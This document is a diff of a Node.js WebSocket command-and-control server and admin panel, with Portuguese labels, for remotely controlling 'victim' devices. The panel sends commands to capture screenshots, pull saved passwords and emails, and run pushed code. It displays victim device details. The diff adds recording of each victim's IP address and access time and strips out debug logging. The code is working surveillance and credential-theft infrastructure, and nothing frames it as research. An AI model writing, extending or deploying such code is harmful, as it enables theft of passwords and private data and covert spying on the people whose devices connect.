@@ -9,8 +9,6 @@ const sessions = {};
 const victimConnections = {};
 const adminClients = new Set();
 
-console.log('🟢 Servidor iniciando...');
-
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -86,7 +84,7 @@ app.get('/', (req, res) => {
     .device-info {
       background:#0e1124; border-radius:10px; padding:8px 14px; margin-bottom:10px;
       border:1px solid #1e2346; font-size:11px; color:#8892c0;
-      display:flex; flex-wrap:wrap; gap:6px 16px; max-height:60px; overflow-y:auto;
+      display:flex; flex-wrap:wrap; gap:6px 16px; max-height:80px; overflow-y:auto;
     }
     .device-info .item { display:flex; gap:4px; white-space:nowrap; }
     .device-info .item .label { color:#4a5580; }
@@ -117,8 +115,13 @@ app.get('/', (req, res) => {
     }
     .log-entry .content { color:#d0d9ff; word-break:break-all; flex:1; font-size:11px; }
     .log-entry .content img.screenshot-thumb {
-      max-width:150px; max-height:100px; border-radius:4px; border:1px solid #2a2f55;
-      cursor:pointer; margin-top:2px; transition:0.2s;
+      max-width:180px;
+      max-height:120px;
+      border-radius:4px;
+      border:1px solid #2a2f55;
+      cursor:pointer;
+      margin-top:2px;
+      transition:0.2s;
     }
     .log-entry .content img.screenshot-thumb:hover { transform:scale(1.02); border-color:#00f0ff; }
     .log-entry .content .json-block {
@@ -194,10 +197,9 @@ app.get('/', (req, res) => {
 
     function connect() {
       ws = new WebSocket(WS_URL);
-      ws.onopen = () => { ws.send(JSON.stringify({type:'admin'})); console.log('[+] Conectado ao servidor'); };
+      ws.onopen = () => { ws.send(JSON.stringify({type:'admin'})); console.log('[+] Conectado'); };
       ws.onmessage = (e) => {
         const msg = JSON.parse(e.data);
-        console.log('[Mensagem recebida]', msg);
         if (msg.type === 'update') {
           if (!allData[msg.sess]) allData[msg.sess] = [];
           allData[msg.sess].push(msg);
@@ -210,8 +212,7 @@ app.get('/', (req, res) => {
           if (keys.length) selectVictim(keys[0]);
         }
       };
-      ws.onclose = () => { console.log('[Desconectado] Reconectando...'); setTimeout(connect, 2000); };
-      ws.onerror = (err) => console.error('[Erro WebSocket]', err);
+      ws.onclose = () => setTimeout(connect, 2000);
     }
 
     // ---------- ENVIA COMANDO ----------
@@ -220,13 +221,11 @@ app.get('/', (req, res) => {
       const payload = { type: 'command', cmd: cmd, target: selectedId };
       if (extra) Object.assign(payload, extra);
       ws.send(JSON.stringify(payload));
-      // Adiciona um log local para feedback
       if (!allData[selectedId]) allData[selectedId] = [];
       allData[selectedId].push({ type: 'cmd_sent', cmd: cmd, _t: Date.now() });
       renderLogs(selectedId);
     }
 
-    // ---------- BOTÕES ----------
     document.getElementById('cmd-screenshot').addEventListener('click', () => sendCommand('screenshot'));
     document.getElementById('cmd-passwords').addEventListener('click', () => sendCommand('get_passwords'));
     document.getElementById('cmd-emails').addEventListener('click', () => sendCommand('get_emails'));
@@ -270,13 +269,15 @@ app.get('/', (req, res) => {
       const div = document.getElementById('device-info');
       if (h && h.device) {
         const d = h.device;
+        const accessTime = h._t ? new Date(h._t).toLocaleString('pt-BR') : 'desconhecido';
         div.style.display = 'flex';
         div.innerHTML = \`
-          <span class="item"><span class="label">Modelo:</span> <span class="value">\${d.deviceModel || '?'}</span></span>
-          <span class="item"><span class="label">Plataforma:</span> <span class="value">\${d.platform || '?'}</span></span>
+          <span class="item"><span class="label">Marca/Modelo:</span> <span class="value">\${d.brand || '?'} \${d.deviceModel || '?'}</span></span>
+          <span class="item"><span class="label">Sistema:</span> <span class="value">\${d.os || '?'} \${d.osVersion || ''}</span></span>
           <span class="item"><span class="label">Tela:</span> <span class="value">\${d.screen?.w || '?'}x\${d.screen?.h || '?'}</span></span>
           <span class="item"><span class="label">RAM:</span> <span class="value">\${d.hardware?.memory || '?'} GB</span></span>
           <span class="item"><span class="label">Rede:</span> <span class="value">\${d.network?.type || '?'}</span></span>
+          <span class="item"><span class="label">Acesso em:</span> <span class="value">\${accessTime}</span></span>
         \`;
       } else {
         div.style.display = 'none';
@@ -348,7 +349,7 @@ app.get('/', (req, res) => {
             content = \`🔗 Link: \${log.href || ''}\`;
             break;
           case 'screenshot_auto':
-            if (log.image) {
+            if (log.image && log.image.startsWith('data:image')) {
               content = \`📸 Auto-print \${log.title || ''} <img src="\${log.image}" class="screenshot-thumb" onclick="event.stopPropagation(); document.getElementById('lb-img').src=this.src; document.getElementById('lightbox').classList.add('active');" />\`;
             } else {
               content = '📸 Auto-print indisponível';
@@ -360,7 +361,7 @@ app.get('/', (req, res) => {
             break;
           case 'cmd_result':
             if (log.cmd === 'screenshot') {
-              if (log.image) {
+              if (log.image && log.image.startsWith('data:image')) {
                 content = \`📸 Print sob demanda <img src="\${log.image}" class="screenshot-thumb" onclick="event.stopPropagation(); document.getElementById('lb-img').src=this.src; document.getElementById('lightbox').classList.add('active');" />\`;
               } else {
                 content = '📸 Print falhou';
@@ -423,26 +424,21 @@ app.get('/', (req, res) => {
 
 // ---------- WEBSOCKET ----------
 wss.on('connection', (ws) => {
-  console.log('[Servidor] Nova conexão WebSocket estabelecida.');
-
   ws.isAdmin = false;
-  let sessId = null; // será preenchido quando a vítima enviar o handshake
+  // Armazena IP se disponível
+  const ip = ws._socket.remoteAddress || 'desconhecido';
 
   ws.on('message', (msg) => {
     try {
       const data = JSON.parse(msg);
-      console.log('[Servidor] Mensagem recebida:', data);
 
-      // Admin
       if (data.type === 'admin') {
         ws.isAdmin = true;
         adminClients.add(ws);
-        console.log('[Servidor] Admin conectado.');
         ws.send(JSON.stringify({ type: 'init', data: sessions }));
         return;
       }
 
-      // Comando de limpeza
       if (data.type === 'clear' && data.sess) {
         if (sessions[data.sess]) sessions[data.sess] = [];
         adminClients.forEach(client => {
@@ -453,22 +449,18 @@ wss.on('connection', (ws) => {
         return;
       }
 
-      // COMANDO: encaminha para a vítima específica
       if (data.type === 'command' && data.target) {
-        console.log(`[Servidor] Comando ${data.cmd} para vítima ${data.target}`);
         const targetWs = victimConnections[data.target];
         if (targetWs && targetWs.readyState === WebSocket.OPEN) {
           const cmdPayload = { type: 'command', cmd: data.cmd };
           if (data.code) cmdPayload.code = data.code;
           targetWs.send(JSON.stringify(cmdPayload));
-          console.log(`[Servidor] Comando enviado para ${data.target}`);
           adminClients.forEach(client => {
             if (client.readyState === WebSocket.OPEN) {
               client.send(JSON.stringify({ type: 'update', sess: data.target, type: 'cmd_sent', cmd: data.cmd, _t: Date.now() }));
             }
           });
         } else {
-          console.log(`[Servidor] Vítima ${data.target} offline.`);
           adminClients.forEach(client => {
             if (client.readyState === WebSocket.OPEN) {
               client.send(JSON.stringify({ type: 'update', sess: data.target, type: 'cmd_error', error: 'Vítima offline', _t: Date.now() }));
@@ -478,23 +470,16 @@ wss.on('connection', (ws) => {
         return;
       }
 
-      // Dados da vítima (inclui handshake e logs normais)
       if (data.sess) {
-        sessId = data.sess;
-        // Armazena a conexão da vítima (para comandos futuros)
         if (!victimConnections[data.sess] || victimConnections[data.sess].readyState !== WebSocket.OPEN) {
           victimConnections[data.sess] = ws;
-          console.log(`[Servidor] Vítima ${data.sess} registrada.`);
-          // Quando a vítima se desconectar, remover do mapa
           ws.on('close', () => {
-            console.log(`[Servidor] Vítima ${data.sess} desconectada.`);
-            if (victimConnections[data.sess] === ws) {
-              delete victimConnections[data.sess];
-            }
+            if (victimConnections[data.sess] === ws) delete victimConnections[data.sess];
           });
         }
-
         if (!sessions[data.sess]) sessions[data.sess] = [];
+        // Adiciona IP ao handshake
+        if (data.type === 'handshake') data.ip = ip;
         sessions[data.sess].push(data);
         adminClients.forEach(client => {
           if (client.readyState === WebSocket.OPEN) {
@@ -502,25 +487,16 @@ wss.on('connection', (ws) => {
           }
         });
       }
-    } catch (e) {
-      console.error('[Servidor] Erro ao processar mensagem:', e);
-    }
+    } catch(e) {}
   });
 
   ws.on('close', () => {
-    console.log('[Servidor] Conexão fechada.');
     if (ws.isAdmin) adminClients.delete(ws);
-    // Remove a vítima do mapa se a conexão for dela
     for (let sess in victimConnections) {
-      if (victimConnections[sess] === ws) {
-        delete victimConnections[sess];
-        console.log(`[Servidor] Vítima ${sess} removida do mapa.`);
-      }
+      if (victimConnections[sess] === ws) delete victimConnections[sess];
     }
   });
 });
 
 const PORT = process.env.PORT || 8080;
-server.listen(PORT, () => {
-  console.log(`✅ Æ Painel rodando na porta ${PORT}`);
-});
+server.listen(PORT, () => console.log(`Æ Painel rodando na porta ${PORT}`));
